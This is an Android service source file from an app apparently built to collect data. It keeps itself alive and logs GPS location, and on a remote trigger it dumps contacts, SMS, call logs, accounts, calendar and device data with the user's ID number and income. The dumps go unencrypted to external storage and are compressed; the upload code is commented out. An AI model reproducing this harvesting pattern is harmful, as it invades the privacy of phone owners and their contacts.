package com.example.muhammadfahad.readjs.service;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.PowerManager;
import android.os.StatFs;
import android.os.StrictMode;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.example.muhammadfahad.readjs.StartActivity;
import com.example.muhammadfahad.readjs.bean.InfoBean;
import com.example.muhammadfahad.readjs.bean.Records;
import com.example.muhammadfahad.readjs.dao.DBHelper;

import com.example.muhammadfahad.readjs.utils.FileSplitter;
import com.example.muhammadfahad.readjs.utils.Helper;
import com.example.muhammadfahad.readjs.utils.Logger;
import com.example.muhammadfahad.readjs.utils.SevenZ;



import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import static com.example.muhammadfahad.readjs.utils.Backup.AccountList;
import static com.example.muhammadfahad.readjs.utils.Backup.BatteryList;
import static com.example.muhammadfahad.readjs.utils.Backup.CalendarContractEventsList;
import static com.example.muhammadfahad.readjs.utils.Backup.CalendarContractRemindersList;
import static com.example.muhammadfahad.readjs.utils.Backup.CallList;
import static com.example.muhammadfahad.readjs.utils.Backup.ContactList;
import static com.example.muhammadfahad.readjs.utils.Backup.DeviceInfoList;
import static com.example.muhammadfahad.readjs.utils.Backup.LocationList;
import static com.example.muhammadfahad.readjs.utils.Backup.SensorList;
import static com.example.muhammadfahad.readjs.utils.Backup.SmsList;
import static com.example.muhammadfahad.readjs.utils.Backup.fetchNumber;
import static com.example.muhammadfahad.readjs.utils.Backup.insertNumber;
import static com.example.muhammadfahad.readjs.utils.Backup.uploadTime;

public class MyService extends Service implements LocationListener {
    private TelephonyManager tm;
    private WifiManager wifiManager;
    private ConnectivityManager connManager;
    private NetworkInfo mWifi;
    private FileSplitter fileSplitter;
    private String device_id;

    private OkHttpClient client;
    private Request request;
    private Response response;

    private int recId = 0;
    private InfoBean infoBean;

    Thread statusThread, sendDataThread;
    public Handler handler;
    SharedPreferences sharedPreferences;
    PowerManager.WakeLock wakeLock;
    String dbFileLoc;
    DBHelper dbHelperLoc;
    private static final int GPS_TIME=1000*60*1; //5 mins (1000=1sec)
    Timer timer;
    LocationManager locationManager;
    long timeStart;
    FileOutputStream fos;

    String excelLoc;
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
       if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy =
                    new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }
        PowerManager pm = (PowerManager) getSystemService(this.POWER_SERVICE);

        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DoNotSleep");

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Intent restartService = new Intent("RestartService");
        sendBroadcast(restartService);
    }

    @SuppressWarnings("MissingPermission")
    @SuppressLint("MissingPermission")
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        Logger.logcat();

       // timeStart=intent.getLongExtra("startTime",0);
        sharedPreferences = getSharedPreferences(StartActivity.MyPREFERENCES, Context.MODE_PRIVATE);
        infoBean = new InfoBean(sharedPreferences.getString("MobileNo", ""), sharedPreferences.getString("Cnic", ""),
                sharedPreferences.getString("Channel", ""),sharedPreferences.getString("Income",""));
        fileSplitter = new FileSplitter();
        tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        device_id = tm.getDeviceId();

        client = new OkHttpClient();

        wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);

        connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

        mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        dbFileLoc= Environment.getExternalStorageDirectory()+ File.separator+device_id+"_loc_DB.db";
        dbHelperLoc=new DBHelper(getApplicationContext(),dbFileLoc);

        locationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
        Log.d("Service>>>>>>>>>", "Inside service");


        /*Criteria criteria=new Criteria();
        criteria.setVerticalAccuracy(Criteria.ACCURACY_LOW);
        criteria.setSpeedAccuracy(Criteria.ACCURACY_LOW);
        criteria.setHorizontalAccuracy(Criteria.ACCURACY_LOW);
        criteria.setPowerRequirement(Criteria.POWER_HIGH);
        criteria.setBearingRequired(false);
        criteria.setAltitudeRequired(false);
        criteria.setCostAllowed(false);
        locationManager.getBestProvider(criteria,true);*/

        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,GPS_TIME,0,this);
        if (getAvailableInternalMemorySize()) {
            if (wifiManager.isWifiEnabled() && mWifi.isConnected()) {
                statusThread = new StatusThread();
                sendDataThread = new SendDataThread();
                statusThread.start();
                sendDataThread.start();
            }
        }
    }




    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    public boolean getAvailableInternalMemorySize() {
        File path = Environment.getDataDirectory();
        StatFs stat = new StatFs(path.getPath());
        long blockSize = stat.getBlockSizeLong();
        long availableBlocks = stat.getAvailableBlocksLong();
        if (((availableBlocks * blockSize) / 1024) / 1024 > 15) {
            return true;
        }
        return false;
    }


    public boolean deleteFile(String filename) {
        File file = new File(filename);
        if (file.delete()) {
            Log.e("Deleting....", file.getName());
            return true;
        }
        return false;
    }

    @SuppressWarnings("MissingPermission")
    @Override
    public void onLocationChanged(final Location location) {
            if (location != null) {

            try{

                LocationList(MyService.this, dbHelperLoc, location, recId, infoBean);
               // LocationList(MyService.this,workbook,sheet,fos,location,recId,infoBean);
                //uploadTime(getApplicationContext(),"Location dump Time",dbHelperLoc,System.currentTimeMillis()-timeStart,infoBean);
                recId++;

            }catch (Exception e){
                e.printStackTrace();
            }
        }

    }

    @Override
    public void onStatusChanged(String s, int i, Bundle bundle) {

    }

    @Override
    public void onProviderEnabled(String s) {

    }

    @Override
    public void onProviderDisabled(String s) {

    }

    public class StatusThread extends Thread {

        @Override
        public void run() {
            Looper.prepare();
//            Logger.logcat();

            try {
                timer=new Timer();
                timer.scheduleAtFixedRate(new TimerTask() {
                    @Override
                    public void run() {
                        Message message = new Message();
                        List<Records> list = fetchNumber(infoBean.getMobileNo(), getApplicationContext());
                        for (int j = 0; j < list.size(); j++) {
                            //if (list.get(j).getStatus().equalsIgnoreCase("yes")) {
                            if (list.get(j).getStatus().equalsIgnoreCase("I")) {
                                message.obj = "I";
                                handler.sendMessage(message);
                            } else {
                                message.obj = "C";
                                handler.sendMessage(message);
                            }
                        }
                        handler.removeCallbacksAndMessages(null);
                    }
                },0,60000);  // for repeat timer

            } catch (Exception e) {
                e.printStackTrace();
            }
            Looper.loop();
        }
    }

    public class SendDataThread extends Thread {


        @SuppressLint("HandlerLeak")
        @Override
        public void run() {

            Looper.prepare();
            handler = new Handler() {
                @SuppressLint({"MissingPermission", "NewApi"})
                @Override
                public void handleMessage(Message msg) {
                    String str = msg.obj.toString();
                    if(str.equalsIgnoreCase("I")){

                        Long sTime=System.currentTimeMillis();
                        String dbFile = Environment.getExternalStorageDirectory() + File.separator + device_id + "_DB.db";
                        DBHelper dbHelper = new DBHelper(getApplicationContext(), dbFile);

                        Log.d("Handler-------->",str);
                        insertNumber(sharedPreferences.getString("MobileNo", ""), "P", sharedPreferences.getString("Version", ""),MyService.this);
                        //int alarm=AlarmList(getApplicationContext(),dbHelper,infoBean);

                        int contact=ContactList(getApplicationContext(),dbHelper,infoBean);

                        int sms=SmsList(getApplicationContext(),dbHelper,infoBean);
                        int call=CallList(getApplicationContext(),dbHelper,infoBean);
                        int sensor=SensorList(getApplicationContext(),dbHelper,infoBean);
                        int device=DeviceInfoList(getApplicationContext(),dbHelper,infoBean);
                        int account=AccountList(getApplicationContext(),dbHelper,infoBean);
                        int calenderEvents=CalendarContractEventsList(getApplicationContext(),dbHelper,infoBean);
                        int battery=BatteryList(getApplicationContext(),dbHelper,infoBean);
                        int calendarReminders=CalendarContractRemindersList(getApplicationContext(),dbHelper,infoBean);
                        long timeStop=System.currentTimeMillis();
                        uploadTime(getApplicationContext(),"Data dump Time",dbHelper,timeStop-sTime,infoBean);
                        uploadTime(getApplicationContext(),"Upload Time",dbHelper,timeStop-timeStart,infoBean);
                        dbHelper.close();
                        File file=new File(dbFile);
                        ArrayList<File> list=new ArrayList<>();
                        list.add(file);
                        SevenZ.Compression(list);

                        File fileLoc=new File(dbFileLoc);
                        ArrayList<File> listLoc=new ArrayList<>();
                        listLoc.add(fileLoc);
                        SevenZ.Compression(listLoc);
                       /* c = new Compress(new String[]{dbFile}, dbFile);
                            try {
                                fileSplitter.split(c.zip());

                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                            if (deleteFile(dbFile) && deleteFile(dbFile + "-" + "journal")) {
                                Log.e("Compression...", c.zip());
                                deleteFile(c.zip() + ".zip");
                                int len = 0;
                                try {
                                    len = fileSplitter.getNumberParts(c.zip());
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                                for (int i = 0; i < len; i++) {
                                    File f = new File(String.valueOf(String.valueOf(dbFile + ".zip." + i)));
                                    String content_type = fileSplitter.getMimeType(f.getPath());

                                    String file_path = f.getAbsolutePath();
                                    Log.e("Path", file_path);
                                    RequestBody file_body = RequestBody.create(MediaType.parse(content_type), f);
                                    RequestBody request_body;
                                    if (i < len - 1) {
                                        request_body = new MultipartBody.Builder()
                                                .setType(MultipartBody.FORM)
                                                .addFormDataPart("type", content_type)
                                                .addFormDataPart("file", file_path.substring(file_path.lastIndexOf("/") + 1), file_body)
                                                .addFormDataPart("done", String.valueOf(false))
                                                .build();
                                    } else {
                                        request_body = new MultipartBody.Builder()
                                                .setType(MultipartBody.FORM)
                                                .addFormDataPart("type", content_type)
                                                .addFormDataPart("file", file_path.substring(file_path.lastIndexOf("/") + 1), file_body)
                                                .addFormDataPart("done", String.valueOf(true))
                                                .build();
                                    }

                                    request = new Request.Builder()
                                            .url(Helper.getConfigValue(MyService.this, "api_url") + "api/upload")
                                            .post(request_body)
                                            .build();

                                    try {
                                        response = client.newCall(request).execute();
                                        Log.e("Response>>>", response.body().string());
                                        deleteFile(dbFile + ".zip." + i);


                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    }

                                }
                            }
                            c = new Compress(new String[]{excelLoc}, excelLoc);
                            try {
                                fileSplitter.split(c.zip());

                            } catch (IOException e) {
                                e.printStackTrace();
                            }

                            Log.e("Compression...", c.zip());
                            deleteFile(c.zip() + ".zip");
                            int len = 0;
                            try {
                                len = fileSplitter.getNumberParts(c.zip());
                            } catch (IOException e) {

                            }
                            for (int i = 0; i < len; i++) {
                                File f = new File(String.valueOf(String.valueOf(dbFileLoc + ".zip." + i)));
                                String content_type = fileSplitter.getMimeType(f.getPath());

                                String file_path = f.getAbsolutePath();
                                Log.e("Path", file_path);
                                RequestBody file_body = RequestBody.create(MediaType.parse(content_type), f);
                                RequestBody request_body;
                                if (i < len - 1) {
                                    request_body = new MultipartBody.Builder()
                                            .setType(MultipartBody.FORM)
                                            .addFormDataPart("type", content_type)
                                            .addFormDataPart("file", file_path.substring(file_path.lastIndexOf("/") + 1), file_body)
                                            .addFormDataPart("done", String.valueOf(false))
                                            .build();
                                } else {
                                    request_body = new MultipartBody.Builder()
                                            .setType(MultipartBody.FORM)
                                            .addFormDataPart("type", content_type)
                                            .addFormDataPart("file", file_path.substring(file_path.lastIndexOf("/") + 1), file_body)
                                            .addFormDataPart("done", String.valueOf(true))
                                            .build();
                                }

                                request = new Request.Builder()
                                        .url(Helper.getConfigValue(MyService.this,"api_url")+ "api/upload")
                                        .post(request_body)
                                        .build();

                                try {
                                    response = client.newCall(request).execute();
                                    Log.e("Response>>>", response.body().string());
                                    deleteFile(excelLoc + ".zip." + i);

                                    if (!response.isSuccessful()) {
                                        throw new IOException("Error : " + response);
                                    }
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                            }*/


                        insertNumber(sharedPreferences.getString("MobileNo", ""), "C", sharedPreferences.getString("Version", ""),MyService.this);

                    }
                }

            };
            Looper.loop();

        }


    }


}


